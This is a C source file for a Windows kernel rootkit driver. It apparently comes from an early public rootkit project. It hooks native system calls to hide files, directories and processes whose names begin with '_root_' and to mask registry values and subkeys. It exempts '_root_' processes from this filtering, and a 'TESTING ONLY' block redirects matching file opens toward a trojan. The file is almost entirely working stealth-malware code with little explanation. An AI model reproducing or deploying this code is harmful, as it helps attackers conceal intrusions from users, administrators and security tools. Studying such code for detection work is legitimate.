
#include "rk_driver.h"
#include "rk_process.h"
#include "rk_ioman.h"
#include "rk_defense.h"
#include "rk_command.h"


// from jeremy kothe's work
FakeDirEntry fdeNull = { 0, 0, 0, 1, 0 };
PDEVICE_OBJECT pdevNull, pdevRoot;
UNICODE_STRING g_suWinSysDir, g_suDriversDir;
//WCHAR g_swRootSys[] = L"_root_.sys";
WCHAR g_swFileHidePrefix[] = L"_root_";




/* NT io manager/filesystems */


/* ______________________________________________________________________________
 . directory hiding shim as per JK's code
 . ______________________________________________________________________________ */

NTSTATUS NewZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
)
{
	NTSTATUS rc;
	CHAR aProcessName[PROCNAMELEN];
		
	GetProcessName( aProcessName );
	DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);

	rc=((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (
			hFile,							/* this is the directory handle */
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery);

  
	// this code adapted from JK code, but cleaned a bit
	if( NT_SUCCESS( rc ) ) 
	{
		
		if(0 == memcmp(aProcessName, "_root_", 6))
		{
			DbgPrint("rootkit: detected file/directory query from _root_ process\n");
		}
		// Look up the file-object for the directory being queried
		// this flag is controlled from the kernel-shell
		else if(g_hide_directories)
		{
			PDirEntry p = (PDirEntry)FileInformationBuffer;
			PDirEntry pLast = NULL;
			BOOL bLastOne;
			do 
			{
				bLastOne = !( p->dwLenToNext );
				
				// this block was used in the JK code for altering null.sys file information?
				// left out for now ... -Greg

				//if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&g_swRootSys[ 0 ], 20 ) == 20 ) 
				//{
				//	p->ftCreate = fdeNull.ftCreate;
				//	p->ftLastAccess = fdeNull.ftLastAccess;
				//	p->ftLastWrite = fdeNull.ftLastWrite;
				//	p->dwFileSizeHigh = fdeNull.dwFileSizeHigh;
				//	p->dwFileSizeLow = fdeNull.dwFileSizeLow;
				//} 
				//else 

				// compare directory-name prefix with '_root_' to decide if to hide or not.
				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&g_swFileHidePrefix[ 0 ], 12 ) == 12 ) 
				{
					if( bLastOne ) 
					{
						if( p == (PDirEntry)FileInformationBuffer ) rc = 0x80000006;
						else pLast->dwLenToNext = 0;
						break;
					} 
					else 
					{
						int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
						int iLeft = (DWORD)FileInformationBufferLength - iPos - p->dwLenToNext;
						RtlCopyMemory( (PVOID)p, (PVOID)( (char *)p + p->dwLenToNext ), (DWORD)iLeft );
						continue;
					}
				}
				pLast = p;
				p = (PDirEntry)((char *)p + p->dwLenToNext );
			} while( !bLastOne );
		}
	}

	return(rc);
}



/* ______________________________________________________________________________
 . shimmy
 . ______________________________________________________________________________ */
NTSTATUS NewZwOpenFile(
	PHANDLE phFile,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK pIoStatusBlock,
	ULONG ShareMode,
	ULONG OpenMode
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwOpenFile() from %s\n", aProcessName);

		DumpObjectAttributes(ObjectAttributes);

        rc=((ZWOPENFILE)(OldZwOpenFile)) (
                        phFile,
                        DesiredAccess,
                        ObjectAttributes,
                        pIoStatusBlock,
                        ShareMode,
                        OpenMode);

		if(*phFile)
		{
			DbgPrint("rootkit: file handle is 0x%X\n", *phFile);
			/* ___________________________________________________
			 . TESTING ONLY
			 . if name starts w/ '_root_' lets redirect to a trojan 
			 . ___________________________________________________ */
			if( !wcsncmp(
						ObjectAttributes->ObjectName->Buffer,
						L"\\??\\C:\\_root_",
						13))
			{
				DbgPrint("rootkit: detected file with name '_root_' - redirecting\n");
				WatchProcessHandle(*phFile);
			}

		}
        DbgPrint("rootkit: ZwOpenFile : rc = %x\n", rc);
        return rc;
}

/* ______________________________________________________________________________
 . shimmy
 . ______________________________________________________________________________ */
NTSTATUS NewNtCreateFile(
                    PHANDLE FileHandle,
                    ACCESS_MASK DesiredAccess,
                    POBJECT_ATTRIBUTES ObjectAttributes,
                    PIO_STATUS_BLOCK IoStatusBlock,
                    PLARGE_INTEGER AllocationSize OPTIONAL,
                    ULONG FileAttributes,
                    ULONG ShareAccess,
                    ULONG CreateDisposition,
                    ULONG CreateOptions,
                    PVOID EaBuffer OPTIONAL,
                    ULONG EaLength)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewNtCreateFile() from %s\n", aProcessName);

		DumpObjectAttributes(ObjectAttributes);

        rc=((NTCREATEFILE)(OldNtCreateFile)) (
                        FileHandle,
                        DesiredAccess,
                        ObjectAttributes,
                        IoStatusBlock,
                        AllocationSize,
                        FileAttributes,
                        ShareAccess,
                        CreateDisposition,
                        CreateOptions,
                        EaBuffer,
                        EaLength);
		if(FileHandle) 
		{
			DbgPrint("rootkit: FileHandle 0x%X\n", *FileHandle);
			
		}

        DbgPrint("rootkit: NtCreateFile : rc = %x\n", rc);
        return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwOpenKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		HANDLE pHandle = GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwOpenKey() from %s\n", aProcessName);

		DumpObjectAttributes(ObjectAttributes);

		/* open the key, as normal */
        rc=((ZWOPENKEY)(OldZwOpenKey)) (
			phKey,
			DesiredAccess,
			ObjectAttributes );
		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
      
#if 1
		if(STATUS_SUCCESS == rc)
		{
			__try
			{
				SetupFakeValueMap( pHandle, *phKey );
			}
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				DbgPrint("rootkit: exception while setting up value map!\n");
			}
		}
#endif
				
		return rc;
}


/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwQueryKey(
	HANDLE hKey,
	KEY_INFORMATION_CLASS KeyInfoClass,
	PVOID KeyInfoBuffer,
	ULONG KeyInfoBufferLength,
	PULONG BytesCopied
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		ULONG numberOfValues = -1;
		ULONG numberOfSubkeys = -1;

		HANDLE pHandle = GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwQueryKey() from %s\n", aProcessName);

		/* _________________________________________________________
		 . regedt32 will query the key to find out how many subitems
		 . there are.  We need to make sure that no hidden values
		 . are enumerated.
		 . _________________________________________________________*/

        rc=((ZWQUERYKEY)(OldZwQueryKey)) (
			hKey,
			KeyInfoClass,
			KeyInfoBuffer,
			KeyInfoBufferLength,
			BytesCopied);
		DbgPrint("rootkit: ZwQueryKey : rc = %x\n", rc);
        
#if 1
		/* _______________________________________________
		 . determine if there are trojan values
		 . _______________________________________________ */
		__try
		{
			numberOfValues = GetNumberOfValues( hKey );
			numberOfSubkeys = GetNumberOfSubkeys( hKey );
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			DbgPrint("rootkit: exception while getting number of values\n");
		}
		
		if(	(STATUS_SUCCESS == rc)
			&&
			(-1 != numberOfValues)
			&&
			(-1 != numberOfSubkeys) )
		{
			DbgPrint("rootkit: detected trojan values under this key\n");
			if(KeyFullInformation == KeyInfoClass)
			{ 
				if(KeyInfoBuffer)
				{
					((KEY_FULL_INFORMATION *)KeyInfoBuffer)->Values = numberOfValues;
					((KEY_FULL_INFORMATION *)KeyInfoBuffer)->SubKeys = numberOfSubkeys;
				}
			}
		}
#endif
		return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwQueryValueKey(
	HANDLE hKey,
	PUNICODE_STRING uValueName,
	KEY_VALUE_INFORMATION_CLASS KeyValueInfoClass,
	PVOID KeyValueInfoBuffer,
	ULONG KeyValueInfoBufferLength,
	PULONG BytesCopied
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );		
		DbgPrint("rootkit: NewZwQueryValueKey() from %s\n", aProcessName);

        rc=((ZWQUERYVALUEKEY)(OldZwQueryValueKey)) (
			hKey,
			uValueName,
			KeyValueInfoClass,
			KeyValueInfoBuffer,
			KeyValueInfoBufferLength,
			BytesCopied);
		DbgPrint("rootkit: ZwQueryValueKey : rc = %x\n", rc);
        return rc;
}


/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwEnumerateValueKey(
	HANDLE hKey,
	ULONG Index,
	KEY_VALUE_INFORMATION_CLASS  KeyValueInfoClass,
	PVOID KeyValueInfoBuffer,
	ULONG KeyValueInfoBufferLength,
	PULONG BytesCopied
)
{
        int rc; 
		CHAR aProcessName[PROCNAMELEN];
		BOOL safe = FALSE;

		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwEnumerateValueKey() with hKey %X from %s\n", hKey, aProcessName);

		/* we really need to maintain a list of index->real key, since
		 . if the user requests keys out-of-order, say, 1,4,3,5,2 etc, the
		 . rootkit will return strange results (currently).
		 . Otherwise, however, if they request values in order, the value
		 . will be hidden. */

		if(KeyValueBasicInformation == KeyValueInfoClass) DbgPrint("-- KeyValueBasicInformation\n");
		if(KeyValueFullInformation == KeyValueInfoClass) DbgPrint("-- KeyValueFullInformation\n");
		if(KeyValuePartialInformation == KeyValueInfoClass) DbgPrint("-- KeyValuePartialInformation\n");

		DbgPrint("-- KeyValueInfoBufferLength %d, index %d\n", KeyValueInfoBufferLength, Index);

#if 1
		if( aProcessName ) 
		{
			/* if the process name starts w/ "_root_"
			 . we will not filter the request ;-) */

			if(!strncmp(aProcessName, "_root_", 6))
			{
				DbgPrint("rootkit: detected safe process %s!\n", aProcessName);
				safe = TRUE;
			}
		}

		if(!safe)
		{
			__try
			{
				int new_index = GetRegValueMapping( hKey, Index );
				if(-1 != new_index) Index = new_index;
				DbgPrint("rootkit: adjusted index for call %d\n", Index);
			}
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				DbgPrint("rootkit: exception while RegValueMapping()\n");
			}
		}
#endif

        rc=((ZWENUMERATEVALUEKEY)(OldZwEnumerateValueKey)) (
			hKey,
			Index,
			KeyValueInfoClass,
			KeyValueInfoBuffer,
			KeyValueInfoBufferLength,
			BytesCopied);

		DbgPrint("rootkit: ZwEnumerateValueKey : rc = %x\n", rc);
        return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwEnumerateKey(
	HANDLE hKey,
	ULONG Index,
	KEY_INFORMATION_CLASS  KeyInfoClass,
	PVOID KeyInfoBuffer,
	ULONG KeyInfoBufferLength,
	PULONG BytesCopied
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		BOOL safe = FALSE;
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwEnumerateKey() from %s\n", aProcessName);

#if 1
		if( aProcessName ) 
		{
			/* if the process name starts w/ "_root_"
			 . we will not filter the request ;-) */

			if(!strncmp(aProcessName, "_root_", 6))
			{
				DbgPrint("rootkit: detected safe process %s!\n", aProcessName);
				safe = TRUE;
			}
		}

		if(!safe)
		{
			__try
			{
				int new_index = GetRegSubkeyMapping( hKey, Index );
				if(-1 != new_index) Index = new_index;
				DbgPrint("rootkit: adjusted subkey index for call %d\n", Index);
			}
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				DbgPrint("rootkit: exception while RegSubkeyMapping()\n");
			}
		}
#endif

        rc=((ZWENUMERATEKEY)(OldZwEnumerateKey)) (
			hKey,
			Index,
			KeyInfoClass,
			KeyInfoBuffer,
			KeyInfoBufferLength,
			BytesCopied);
		DbgPrint("rootkit: ZwEnumerateKey : rc = %x\n", rc);
        return rc;
}


/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwDeleteKey(
	HANDLE hKey
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwDeleteKey() from %s\n", aProcessName);

        rc=((ZWDELETEKEY)(OldZwDeleteKey)) (
			hKey
			);
		DbgPrint("rootkit: ZwDeleteKey : rc = %x\n", rc);
        return rc;
}


/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwFlushKey(
	HANDLE hKey
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwFlushKey() from %s\n", aProcessName);

        rc=((ZWFLUSHKEY)(OldZwFlushKey)) (
			hKey
			);
		DbgPrint("rootkit: ZwFlushKey : rc = %x\n", rc);
        return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwSetValueKey(
	HANDLE hKey,
	PUNICODE_STRING uValueName,
	ULONG TitleIndex,
	ULONG ValueType,
	PVOID pValueData,
	ULONG pValueDataLength
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwSetValueKey() from %s\n", aProcessName);

        rc=((ZWSETVALUEKEY)(OldZwSetValueKey)) (
			hKey,
			uValueName,
			TitleIndex,
			ValueType,
			pValueData,
			pValueDataLength
			);
		DbgPrint("rootkit: ZwSetValueKey : rc = %x\n", rc);
        return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwCreateKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG TitleIndex,
	PUNICODE_STRING Class,
	ULONG CreateOptions,
	PULONG pDisposition
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwCreateKey() from %s\n", aProcessName);

		DumpObjectAttributes(ObjectAttributes);

        rc=((ZWCREATEKEY)(OldZwCreateKey)) (
			phKey,
			DesiredAccess,
			ObjectAttributes,
			TitleIndex,
			Class,
			CreateOptions,
			pDisposition );
		DbgPrint("rootkit: ZwCreateKey : rc = %x\n", rc);
        return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwDeleteValueKey(
	HANDLE hKey,
	PUNICODE_STRING pValueName
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwDeleteValueKey() from %s\n", aProcessName);

        rc=((ZWDELETEVALUEKEY)(OldZwDeleteValueKey)) (
			hKey,
			pValueName);
		DbgPrint("rootkit: ZwDeleteValueKey : rc = %x\n", rc);
        return rc;
}


/* ______________________________________________________________________________
 . FROM J.K.'s work, directory hiding technique, not used for now since we
 . aren't trying to hide just a driver file...
 . ______________________________________________________________________________ */

BOOL IsHidingDir( HANDLE hFile ) 
{
  PFILE_OBJECT pfo;
  BOOL bIsHiding;

  ObReferenceObjectByHandle(	hFile, 
								FILE_READ_DATA, 
								NULL, 
								0, 
								(void **)&pfo, 
								NULL );
  
  bIsHiding = ( pfo->DeviceObject == pdevRoot );
  
  if( bIsHiding ) 
  {
    BYTE bWinSysDir =
      (BYTE) RtlEqualUnicodeString(		&g_suWinSysDir, 
										&pfo->FileName, 
										FALSE );

    if( bWinSysDir == 0 )
      bWinSysDir = (BYTE) RtlEqualUnicodeString(	&g_suDriversDir, 
													&pfo->FileName, 
													FALSE );

    bIsHiding = bWinSysDir != 0;
  }
  ObDereferenceObject( pfo );
  return bIsHiding;
}

void _stdcall GetFileFullPath(	PFILE_OBJECT pfo, 
								WCHAR **ppsw, 
								PULONG pdwSize ) 
{
  PFILE_OBJECT pfoRelated = pfo->RelatedFileObject;
  if( pfoRelated != NULL ) 
  {
    GetFileFullPath( pfoRelated, ppsw, pdwSize );
    *(*ppsw)++ = 0x5c;
  }
  if( (*pdwSize) >= pfo->FileName.Length ) 
  {
    RtlCopyMemory( *ppsw, pfo->FileName.Buffer, pfo->FileName.Length );
    *ppsw += (pfo->FileName.Length/2);
    (*pdwSize) -= pfo->FileName.Length;
  }
  **ppsw = 0;
}

/* ______________________________________________________________________________
 . SystemInformation - this is a big SHIM point, hide processes & threads, etc
 . ______________________________________________________________________________ */

NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength
)
{
	NTSTATUS rc;
	CHAR aProcessName[PROCNAMELEN];
		
	GetProcessName( aProcessName );
	DbgPrint("rootkit: NewZwQuerySystemInformation() from %s\n", aProcessName);


	rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
			SystemInformationClass,
			SystemInformation,
			SystemInformationLength,
			ReturnLength );

	if( NT_SUCCESS( rc ) ) 
	{
		// double check the process name, if it starts w/ '_root_' DO NOT
		// apply any stealth
		if(0 == memcmp(aProcessName, "_root_", 6))
		{
			DbgPrint("rootkit: detected system query from _root_ process\n");
		}
		else if( g_hide_proc && (5 == SystemInformationClass))
		{
			// this is a process list, look for process names that start with
			// '_root_'
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;
			while(curr)
			{	
				//struct _SYSTEM_PROCESSES *next = ((char *)curr += curr->NextEntryDelta);
				
				ANSI_STRING process_name;
				RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
				if( (0 < process_name.Length) && (255 > process_name.Length) )
				{
					if(0 == memcmp( process_name.Buffer, "_root_", 6))
					{
						//////////////////////////////////////////////
						// we have a winner!
						//////////////////////////////////////////////
						char _output[255];
						char _pname[255];
						memset(_pname, NULL, 255);
						memcpy(_pname, process_name.Buffer, process_name.Length);

						sprintf(	_output, 
									"rootkit: hiding process, pid: %d\tname: %s\r\n", 
									curr->ProcessId, 
									_pname);
						DbgPrint(_output);

						if(prev)
						{
							if(curr->NextEntryDelta)
							{
								// make prev skip this entry
								prev->NextEntryDelta += curr->NextEntryDelta;
							}
							else
							{
								// we are last, so make prev the end
								prev->NextEntryDelta = 0;
							}
						}
						else
						{
							if(curr->NextEntryDelta)
							{
								// we are first in the list, so move it forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else
							{
								// we are the only process!
								SystemInformation = NULL;
							}
						}
					}
				}
				RtlFreeAnsiString(&process_name);
				prev = curr;
				if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}
		}
	}
	return(rc);
}
